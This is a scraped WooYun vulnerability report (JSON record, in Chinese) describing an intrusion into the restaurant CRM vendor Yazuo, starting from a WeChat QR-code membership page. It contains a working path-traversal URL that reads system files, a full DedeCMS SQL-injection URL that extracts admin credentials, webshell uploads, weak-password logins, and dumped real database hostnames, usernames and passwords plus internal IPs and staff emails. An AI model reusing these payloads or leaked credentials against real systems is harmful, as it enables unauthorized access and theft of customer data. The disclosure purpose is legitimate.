{"id": 2965, "wybug_id": "wooyun-2014-062555", "wybug_title": "从一个二维码到雅座全线数据", "wybug_corp": "雅座", "wybug_author": "s0mun5", "wybug_date": "2014-05-28 15:07", "wybug_open_date": "2014-07-12 15:08", "wybug_type": "成功的入侵事件", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-28：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-07-12：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 雅座，成立于2006年4月，是国内餐饮行业最大的CRM服务提供商。总部位于北京，已在全国50个城市设立了办事处。同时，在无锡iPark软件园建设了国内最大的餐饮数据储备中心，产品研发中心，客服中心和面向餐饮业提供专业管理培训的雅座商学院。前两天出去吃饭走到一家新辣道门前服务员非得拉我扫二维码加会员，碍于不好拒绝就扫了一下，然后就有了这次的洞。 详细说明：  关注以后在微信里的会员页面如下没有检测ua 在pc的浏览器上也可以打开\n\n商家logo那里有任意文件读取先收集信息备用http://58.83.233.44/yazuo-weixin/weixin/phonePage/getImage.do?brandId=1119&name=../../../../../../etc/passwdeth0\n# Xen Virtual EthernetDEVICE=eth0BOOTPROTO=noneONBOOT=yesHWADDR=2e:97:34:fd:02:b0NETMASK=255.255.255.0IPADDR=192.168.50.60GATEWAY=192.168.50.254TYPE=Ethernet\nhosts\n# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1       localhost.localdomain localhost::1\t\tlocalhost6.localdomain6 localhost6#192.168.50.30      crmdb.yazuoyw.com#192.168.50.60   WMSTradeServer#192.168.56.40   www.backup.com#192.168.49.50   tradedb.yazuoyw1.com#192.168.50.50   crmdb.yazuoyw1.com#192.168.49.30   tradedb.yazuoyw.com#192.168.50.100     possys.yazuoyw.com192.168.50.60   WMSTradeServer192.168.49.30   tradedb.yazuoyw.com192.168.49.55   bak.tradedb.yazuoyw.com192.168.50.30   crmdb.yazuoyw.com192.168.50.55   bak.crmdb.yazuoyw.com192.168.49.210  crmapi.yazuoyw.com192.168.49.210  possys.yazuoyw.com192.168.49.210  webservice.yazuoyw.com192.168.49.210  mq.yazuoyw.com192.168.59.10   gp.yazuoyw.com192.168.50.160  memcache1.yazuoyw.com192.168.50.165  memcache2.yazuoyw.com192.168.49.70   miralcedb.yazuoyw.com\n扫描c断 大致确定是58.83.233.30-70http://crm.yazuo.com/  雅座crm  核心系统http://58.83.233.61/index.htm 合同管理http://58.83.233.57/index.html 销售管理http://58.83.233.56/ ERPhttp://www.yazuo.com/ 主站http://58.83.233.44/yazuo-weixin/weixin/ 这个是在各个店里为微信扫码用的接口   漏洞证明：  先说比较重要的问题主站是dedecms的 存在注入\nhttp://www.yazuo.com/plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294\n\n文档的名称是：|nnwhko|4057d57572f1303b1bef网址是：http://127.0.0.1:819=3\n后台刚刚好就是这个用户名http://www.yazuo.com/nnwhko/login.php?gotopage=%2Fnnwhko%2F破解密码成功进入后台getshell\n\nCRM系统无法注册，只能猜密码凭借多年的人品 18888888888 密码123456 成功进入刚好还是个管理员 太赞了\n\n功能相当强大 可以管理会员各种信息 充值余额 发送短信等等等等当然充值余额这个是最实用的看看这一个连锁店的业绩 啧啧啧（后面进入ERP后发现有三四百家店 俏江南啊 呷哺呷哺啊 新辣道啊 什么很多知名的都有）\n\n创建营销上传图片的地方成功gelshell\n\n\n<VirtualHost *:80>    DocumentRoot \"/yazuo_apps/crm35/current/public/\"    ServerName crm.yazuo.com    CustomLog \"|cronolog /var/log/httpd/crm.yazuo.com/access_log.%Y%m%d \" combined    ErrorLog \"|cronolog /var/log/httpd/crm.yazuo.com/error_log.%Y%m%d \"        <Directory \"/yazuo_apps/crm35\">                Options FollowSymLinks                AllowOverride all                Order allow,deny                Allow from all        </Directory></VirtualHost>#图片服务器<VirtualHost *:80>    DocumentRoot \"/yazuo_apps/crm35/current/data/upload/\"    ServerName static.yazuo.com    CustomLog \"|cronolog /var/log/httpd/static.yazuo.com/access_log.%Y%m%d \" combined    ErrorLog \"|cronolog /var/log/httpd/static.yazuo.com/error_log.%Y%m%d \"        <Directory \"/yazuo_apps/crm35\">                Options FollowSymLinks                AllowOverride all                Order allow,deny                Allow from all        </Directory></VirtualHost>#微信crm<VirtualHost *:80>    DocumentRoot \"/yazuo_apps/weixin_crm/current/public/\"    ServerName weixincrm.yazuo.com    CustomLog \"|cronolog /var/log/httpd/weixin_crm/access_log.%Y%m%d \" combined    ErrorLog \"|cronolog /var/log/httpd/weixin_crm/error_log.%Y%m%d \"        <Directory \"/yazuo_apps/weixin_crm\">                Options FollowSymLinks                AllowOverride all                Order allow,deny                Allow from all        </Directory></VirtualHost>#微信crm演示<VirtualHost *:80>    DocumentRoot \"/yazuo_apps/weixin_crm_test/current/public/\"    ServerName 58.83.233.45    CustomLog \"|cronolog /var/log/httpd/weixin_crm_test/access_log.%Y%m%d \" combined    ErrorLog \"|cronolog /var/log/httpd/weixin_crm_test/error_log.%Y%m%d \"        <Directory \"/yazuo_apps/weixin_crm_test\">                Options FollowSymLinks                AllowOverride all                Order allow,deny                Allow from all        </Directory></VirtualHost><VirtualHost *:80>    DocumentRoot \"/yazuo_apps/yazuoapi\"    ServerName space.yazuosoft.com    CustomLog \"|cronolog /var/log/httpd/space.yazuosoft.com/access_log.%Y%m%d \" combined    ErrorLog \"|cronolog /var/log/httpd/space.yazuosoft.com/error_log.%Y%m%d \"        <Directory \"/yazuo_apps/yazuoapi\">                Options FollowSymLinks                AllowOverride all                Order allow,deny                Allow from all        </Directory></VirtualHost>#memcached管理工具<Directory \"/yazuo_apps/memadmin\">\tOptions FollowSymLinks\tAllowOverride all\tOrder allow,deny\tAllow from all</Directory><VirtualHost *:80>    DocumentRoot \"/yazuo_apps/memadmin/\"    ServerName memadmin.yazuo.com</VirtualHost>\n配置文件太炫酷了 各种库的参数\ndb' =>     array (      'adapter' => 'PDO_PGSQL',      'params' =>       array (        'host' => 'crmdb.yazuoyw.com',        'port' => '5432',        'username' => 'dev',        'password' => 'devASDFZXCV',        'dbname' => 'crm',      ),    ),    'multidb' =>     array (      'db1' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'crmdb.yazuoyw.com',        'port' => '5432',        'username' => 'dev',        'password' => 'devASDFZXCV',        'dbname' => 'crm',        'default' => '1',      ),      'db2' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'crmdb.yazuoyw.com',        'port' => '5432',        'username' => 'dev',        'password' => 'devASDFZXCV',        'dbname' => 'crm',      ),      'dbmsg' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'crmdb.yazuoyw.com',        'port' => '5432',        'username' => 'dev',        'password' => 'devASDFZXCV',        'dbname' => 'shortmessage',      ),      'dbtrade' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'tradedb.yazuoyw.com',        'port' => '5432',        'username' => 'oper',        'password' => 'oper#EDC$RFV',        'dbname' => 'trade',      ),      'dbweixin' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'crmdb.yazuoyw.com',        'port' => '5432',        'username' => 'weixin',        'password' => 'weixinASDFZXCV',        'dbname' => 'crm',      ),      'db70' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'crmdb.yazuoyw.com',        'port' => '5432',        'username' => 'trace',        'password' => 'tracecrm',        'dbname' => 'crm',      ),      'dbgp' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'gp.yazuoyw.com',        'port' => '5432',        'username' => 'dev',        'password' => 'devASDFZXCV',        'dbname' => 'crm',      ),      'dbweibo' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => 'gp.yazuoyw.com',        'port' => '5432',        'username' => 'weibo',        'password' => 'weibogp',        'dbname' => 'weibo_product',      ),      'dberp' =>       array (        'adapter' => 'PDO_PGSQL',        'host' => '192.168.49.100',        'port' => '5432',        'username' => 'erp',        'password' => 'erp',        'dbname' => 'erp',      ),array (        'email' => 'webadmin@yazuo.com',        'name' => '雅座CRM标准版',      ),      'defaultReplyTo' =>       array (        'email' => 'songlixin@yazuo.com',        'name' => '宋利新',      ),      'marketingReplyList' =>       array (        0 =>         array (          'email' => 'songlixin@yazuo.com',   (wooyun联系厂商的话 可以试试这个email)          'name' => '宋利新',        ),        1 =>         array (          'email' => 'yingxiao@yazuo.com',          'name' => '营销组',        ),      ),\n剩下的不用说了 成功在weixin库里找到了自己的注册信息 当然还有余额之类的数据量没有具体看 应该不少下一个http://58.83.233.57/index.html  test/test弱口令成功进入 木有测试是否能getshell因为数据库已经拿到了ERP啊之类的站的库在上面也能找到管理员手机号1360130xxxx 也登陆成功   修复方案：  提醒一句 crm大部分用户的密码都是某个弱口令 这样不太好   版权声明：转载请注明来源 s0mun5@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：15 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2014-05-28 16:39 |    \t\tc4bbage \t\t\t( 路人 |\t\t\t        Rank:15 漏洞数:7        | var_dump($me);)\t\t \n  么么哒 //再扫个条形码,会不会怀孕    \n     2014-05-28 21:02 |    \t\ts0mun5  \t\t\t( 普通白帽子  |\t\t\t        Rank:493 漏洞数:24        | .)\t\t \n  @c4bbage 你的肚子大了么    \n     2014-05-29 19:29 |    \t\tKuuki \t\t\t( 普通白帽子  |\t\t\t        Rank:158 漏洞数:23        | :P)\t\t \n  服务员：怪我喽？    \n     2014-05-30 15:58 |    \t\tSiro \t\t\t( 实习白帽子  |\t\t\t        Rank:66 漏洞数:11        | )    <Freedom />    (Fuck)\t\t \n  新思路么，马克    \n     2014-06-10 17:30 |    \t\t止刃 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:2        | www.qiuzhufu.com    ฏ๎๎๎๎๎๎๎๎๎...)\t\t \n  mark    \n     2014-11-16 22:03 |    \t\t廷廷 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 有很强的好奇心，爱好广泛，求女女带走。。...)\t\t \n   真叼    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 15, "Ranks": null}